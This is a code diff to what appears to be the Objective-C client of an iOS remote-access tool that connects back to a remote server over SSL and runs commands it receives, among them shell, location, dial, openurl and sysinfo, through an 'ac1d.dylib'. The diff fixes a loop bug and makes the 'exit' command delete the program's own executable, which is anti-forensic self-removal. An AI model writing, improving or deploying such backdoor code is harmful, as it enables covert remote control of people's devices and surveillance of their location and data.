@@ -27,6 +27,7 @@
 NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"shell", @"state", @"sysinfo", @"openurl", @"openapp", nil];
 
 int sockfd, newsockfd;
+NSString *executable;
 SSL_CTX *ssl_client_ctx;
 SSL *client_ssl;
 struct sockaddr_in serverAddress;
@@ -46,6 +47,7 @@ int main(int argc, const char *argv[]) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
+            executable = args[0];
             if ([args[1] isEqualToString:@"-h"] || [args[1] isEqualToString:@"--help"]) showHelpMessage(); 
             else if ([args[1] isEqualToString:@"-v"] || [args[1] isEqualToString:@"--version"]) showVersionMessage();
             else if ([args[1] isEqualToString:@"-r"] || [args[1] isEqualToString:@"--remote"]) {
@@ -105,7 +107,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     
     char buffer[2048] = "";
     
-    while (SSL_read(client_ssl, buffer, sizeof(buffer));) {
+    while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
         memset(buffer, '\0', 2048);
     
@@ -125,7 +127,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
                 SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
             } else if (debug) printf("[-] Failed to execute command, ac1d.dylib not found!\n");
         } else if ([args[0] isEqualToString:@"exit"]) {
-            break;
+            remove(executable);
         } else {
             if (debug) printf("[-] Unrecognized command!\n");
             sendString(@"error");
